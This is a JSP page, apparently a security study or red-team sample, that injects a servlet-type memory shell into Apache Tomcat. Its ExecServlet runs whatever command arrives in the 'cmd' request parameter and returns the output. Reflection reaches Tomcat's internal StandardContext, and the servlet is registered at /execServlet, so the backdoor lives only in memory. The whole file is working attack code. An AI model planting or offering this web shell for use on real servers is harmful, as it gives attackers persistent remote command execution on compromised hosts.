<%--
  Created by IntelliJ IDEA.
  User: hzy20
  Date: 2025/11/21
  Time: 18:01
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    // 创建可以执行恶意命令的Servlet类
    public class ExecServlet extends HttpServlet {
        public void init() throws ServletException {}
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd != null){
                Process p = null;
                BufferedReader bufferedReader = null;
                try{
                    p = Runtime.getRuntime().exec(cmd);
                    bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = bufferedReader.readLine()) != null){
                        resp.getWriter().println(line);
                    }
                } catch (Exception e) {
                    // 异常处理
                    e.printStackTrace();
                } finally {
                    // 资源清理
                    if (bufferedReader != null) {
                        try {
                            bufferedReader.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                    if (p != null) {
                        try {
                            p.waitFor();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }
        public void destroy() {}
    }
%>
<%
    // 从Request中获取ServletContext对象
    ServletContext servletContext = request.getServletContext();
    // 获取ApplicationContext对象
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    // 获取StandardContext对象
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
    //创建为Context创建一个Wrapper对象
    Wrapper wrapper = standardContext.createWrapper();
    // 设置Wrapper对象的名称和类名
    wrapper.setName("execServlet");
    wrapper.setServletClass(ExecServlet.class.getName());
    // 将恶意的Servlet封装进Wrapper
    wrapper.setServlet(new ExecServlet());
    // 将wrapper添加到上下文并设置映射路径
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/execServlet", "execServlet");
%>
</body>
</html>
